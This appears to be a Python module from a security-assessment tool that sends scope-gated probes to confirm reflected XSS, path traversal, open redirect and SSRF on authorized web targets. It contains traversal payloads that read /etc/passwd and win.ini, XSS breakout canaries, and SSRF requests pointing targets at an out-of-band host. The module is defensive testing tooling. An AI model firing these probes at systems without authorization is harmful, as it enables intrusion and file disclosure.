"""Built-in active web-exploit CONFIRMATION probes (stdlib-only, scope-gated).

This is the offensive counterpart to :mod:`aegis.targets.livehttp`: where the
passive prober reads headers and looks for exposed resources, this module sends
*uniquely-marked, benign* payloads to confirm whether a class of web
vulnerability is actually present on an **authorized** target, and reports that
confirmation as evidence.

Design posture — confirmation, not weaponization:

* **Scope-gated.** Every request passes the engagement
  :class:`~aegis.core.authorization.AuthorizationScope` first (pure check); an
  out-of-scope URL is never contacted.
* **Offline-aware.** In offline mode only loopback/local hosts are contacted.
* **No off-scope egress.** Redirects are never followed; the open-redirect check
  uses an unroutable ``.invalid`` marker, so nothing is ever fetched off-target.
* **Benign canaries only.** Reflected-XSS uses breakout characters plus a unique
  token (no script/event-handler payload); traversal reads a benign system file
  to prove the read primitive. No data exfiltration, no state change, no code
  execution.
* **Bounded.** Per-request timeout and a hard cap on the number of checks.

It is gated behind ``scan.active_exploit`` (default off) and driven by
:class:`~aegis.agents.offensive.WebExploitAgent`.
"""

from __future__ import annotations

import re
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from ..core.authorization import AuthorizationScope
from .livehttp import _host_of, _is_local, _NoRedirect

_MAX_BODY = 262_144
_RAND = re.compile(r"[^a-z0-9]")

# Common parameter names worth probing, grouped by the class they tend to carry.
_XSS_PARAMS = ("q", "query", "search", "s", "name", "msg", "message", "comment",
               "term", "keyword", "input", "text", "title")
_FILE_PARAMS = ("file", "path", "page", "template", "doc", "document", "include",
                "download", "view", "lang", "dir", "folder", "load")
_REDIRECT_PARAMS = ("url", "redirect", "redirect_uri", "redirecturl", "next",
                    "return", "returnurl", "return_url", "dest", "destination",
                    "continue", "goto", "r", "u", "link")
_SSRF_PARAMS = ("url", "uri", "target", "dest", "callback", "webhook", "feed",
                "src", "host", "proxy", "fetch", "image")

# A benign LFI proof: reading /etc/passwd (or win.ini) demonstrates the read
# primitive without touching anything sensitive or mutating state.
_TRAVERSAL_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
)
_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.M)
_WININI_MARKERS = ("[fonts]", "[extensions]", "for 16-bit app support")


@dataclass
class ExploitHit:
    """A confirmed (or candidate) active-exploit finding with reproduction info."""

    kind: str                              # reflected_xss|path_traversal|open_redirect|ssrf
    url: str
    param: str = ""
    severity_hint: str = "high"
    detail: dict = field(default_factory=dict)
    evidence: str = ""                     # short proof snippet
    confirmed: bool = True                 # False => candidate needing OOB verification

    def to_dict(self) -> dict:
        return {"kind": self.kind, "url": self.url, "param": self.param,
                "severity_hint": self.severity_hint, "detail": dict(self.detail),
                "evidence": self.evidence[:300], "confirmed": self.confirmed}


@dataclass
class _Resp:
    status: int | None = None
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    location: str = ""


def _with_param(url: str, param: str, value: str) -> str:
    """Return ``url`` with ``param=value`` set in the query string (safely)."""
    parts = urlparse(url)
    query = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
             if k != param]
    query.append((param, value))
    return urlunparse(parts._replace(query=urlencode(query)))


class ActiveExploitProbe:
    """Scope-gated, stdlib-only active confirmation prober."""

    def __init__(
        self,
        scope: AuthorizationScope,
        *,
        offline: bool = True,
        timeout_s: float = 6.0,
        max_checks: int = 400,
        oob_host: str | None = None,
        dry_run: bool = False,
        user_agent: str = "AEGIS/0.1 (authorized assessment)",
    ) -> None:
        self.scope = scope
        self.offline = offline
        self.timeout_s = timeout_s
        self.max_checks = max_checks
        self.oob_host = oob_host
        self.dry_run = dry_run
        self.user_agent = user_agent
        self._opener = urllib.request.build_opener(_NoRedirect)
        self._checks = 0
        #: per-request audit trail — every attempt (sent, refused, or errored),
        #: so an authorized request that found nothing is still recorded.
        self.audit_log: list[dict] = []

    def _audit(self, url: str, *, allowed: bool, status: int | None,
               note: str) -> None:
        self.audit_log.append({"method": "GET", "url": url, "allowed": allowed,
                               "status": status, "note": note})

    # -- single request (scope + offline gated, no redirects) --------------- #
    def _get(self, url: str) -> _Resp | None:
        if self._checks >= self.max_checks:
            return None
        if not self.scope.check_url(url).allowed:       # pure guard, no budget use
            self._audit(url, allowed=False, status=None, note="refused: out of scope")
            return None
        if self.offline and not _is_local(_host_of(url)):
            self._audit(url, allowed=False, status=None,
                        note="refused: offline policy (non-local host)")
            return None
        self._checks += 1
        if self.dry_run:                                # plan only: never send
            self._audit(url, allowed=True, status=None, note="dry-run: would send")
            return None
        req = urllib.request.Request(url, method="GET",
                                     headers={"User-Agent": self.user_agent})
        try:
            with self._opener.open(req, timeout=self.timeout_s) as r:
                resp = self._read(r.status, r.reason, r.headers, r)
        except urllib.error.HTTPError as e:             # 3xx/4xx/5xx are real responses
            resp = self._read(e.code, e.reason or "", e.headers, e)
        except (urllib.error.URLError, TimeoutError, ConnectionError, OSError) as e:
            self._audit(url, allowed=True, status=None,
                        note=f"error: {type(e).__name__}")
            return None
        self._audit(url, allowed=True, status=resp.status, note="sent")
        return resp

    def _read(self, status, reason, headers, stream) -> _Resp:
        hdrs = {k.lower(): v for k, v in dict(headers or {}).items()}
        try:
            raw = stream.read(_MAX_BODY)
        except Exception:
            raw = b""
        return _Resp(status=status, headers=hdrs,
                     body=raw.decode("utf-8", "replace"),
                     location=hdrs.get("location", ""))

    def _rand(self, *keys: object) -> str:
        from ..core.types import stable_hash
        return _RAND.sub("", stable_hash("activeprobe", *keys))[:8]

    # -- reflected XSS confirmation ----------------------------------------- #
    def confirm_reflected_xss(self, urls: list[str]) -> list[ExploitHit]:
        """Confirm HTML-context reflection: a unique token plus the breakout
        characters ``'"<>`` echoed back UNENCODED. A correctly-encoding app
        returns ``&lt;``/``&quot;`` and is not flagged (conservative, low-FP)."""
        hits: list[ExploitHit] = []
        for url in urls:
            for param in _XSS_PARAMS:
                token = f"aegisx{self._rand(url, param, 'xss')}"
                canary = f"{token}'\"<{token}>"        # breakout chars, non-executable
                resp = self._get(_with_param(url, param, canary))
                if resp is None or resp.status is None:
                    if self._checks >= self.max_checks:
                        return hits
                    continue
                if canary in resp.body:                # verbatim, unencoded reflection
                    idx = resp.body.find(canary)
                    hits.append(ExploitHit(
                        kind="reflected_xss", url=_with_param(url, param, "<canary>"),
                        param=param, severity_hint="high",
                        detail={"context": "html", "token": token},
                        evidence=resp.body[max(0, idx - 20): idx + len(canary) + 20]))
                    break                               # one confirmation per URL is enough
        return hits

    # -- path traversal / LFI confirmation ---------------------------------- #
    def confirm_path_traversal(self, urls: list[str]) -> list[ExploitHit]:
        hits: list[ExploitHit] = []
        for url in urls:
            found = False
            for param in _FILE_PARAMS:
                for payload in _TRAVERSAL_PAYLOADS:
                    resp = self._get(_with_param(url, param, payload))
                    if resp is None:
                        if self._checks >= self.max_checks:
                            return hits
                        continue
                    sig = self._traversal_signature(resp.body)
                    if sig:
                        hits.append(ExploitHit(
                            kind="path_traversal",
                            url=_with_param(url, param, payload), param=param,
                            severity_hint="high",
                            detail={"file": sig, "payload": payload},
                            evidence=self._first_match(resp.body)))
                        found = True
                        break
                if found:
                    break
        return hits

    @staticmethod
    def _traversal_signature(body: str) -> str | None:
        if _PASSWD_RE.search(body):
            return "/etc/passwd"
        low = body.lower()
        if any(m in low for m in _WININI_MARKERS):
            return "windows/win.ini"
        return None

    @staticmethod
    def _first_match(body: str) -> str:
        m = _PASSWD_RE.search(body)
        if m:
            return body[m.start(): m.start() + 120]
        low = body.lower()
        for marker in _WININI_MARKERS:
            i = low.find(marker)
            if i >= 0:
                return body[i: i + 120]
        return ""

    # -- open redirect confirmation ----------------------------------------- #
    def confirm_open_redirect(self, urls: list[str]) -> list[ExploitHit]:
        """A 3xx whose Location points at an attacker-controlled host confirms an
        open redirect. The marker uses the unroutable ``.invalid`` TLD and
        redirects are never followed, so nothing off-target is ever contacted."""
        hits: list[ExploitHit] = []
        for url in urls:
            for param in _REDIRECT_PARAMS:
                marker = f"aegis-redir-{self._rand(url, param, 'redir')}.invalid"
                for payload in (f"https://{marker}/", f"//{marker}/"):
                    resp = self._get(_with_param(url, param, payload))
                    if resp is None:
                        if self._checks >= self.max_checks:
                            return hits
                        continue
                    loc = resp.location
                    if resp.status and 300 <= resp.status < 400 and marker in loc:
                        hits.append(ExploitHit(
                            kind="open_redirect",
                            url=_with_param(url, param, payload), param=param,
                            severity_hint="medium",
                            detail={"status": resp.status, "location": loc[:200]},
                            evidence=f"HTTP {resp.status} -> Location: {loc[:160]}"))
                        break
                else:
                    continue
                break
        return hits

    # -- SSRF (candidate; needs an out-of-band collaborator to confirm) ----- #
    def probe_ssrf(self, urls: list[str]) -> list[ExploitHit]:
        """Send an OOB marker to likely SSRF sinks. We cannot confirm receipt from
        here, so each is reported as a *candidate* to verify against the
        collaborator at ``oob_host``. Skipped entirely when no oob_host is set."""
        if not self.oob_host:
            return []
        hits: list[ExploitHit] = []
        for url in urls:
            for param in _SSRF_PARAMS:
                token = self._rand(url, param, "ssrf")
                payload = f"http://{self.oob_host}/aegis-ssrf-{token}"
                resp = self._get(_with_param(url, param, payload))
                if resp is None:
                    if self._checks >= self.max_checks:
                        return hits
                    continue
                hits.append(ExploitHit(
                    kind="ssrf", url=_with_param(url, param, payload), param=param,
                    severity_hint="medium", confirmed=False,
                    detail={"oob_host": self.oob_host, "token": token,
                            "verify": f"check {self.oob_host} logs for aegis-ssrf-{token}"},
                    evidence=f"sent OOB marker to {param}; verify collaborator hit"))
                break
        return hits

    # -- orchestration ------------------------------------------------------ #
    def assess(self, urls: list[str], *, include_ssrf: bool = False) -> list[ExploitHit]:
        """Run every confirmation check across the candidate URLs, within budget."""
        hits: list[ExploitHit] = []
        hits += self.confirm_reflected_xss(urls)
        hits += self.confirm_path_traversal(urls)
        hits += self.confirm_open_redirect(urls)
        if include_ssrf:
            hits += self.probe_ssrf(urls)
        return hits
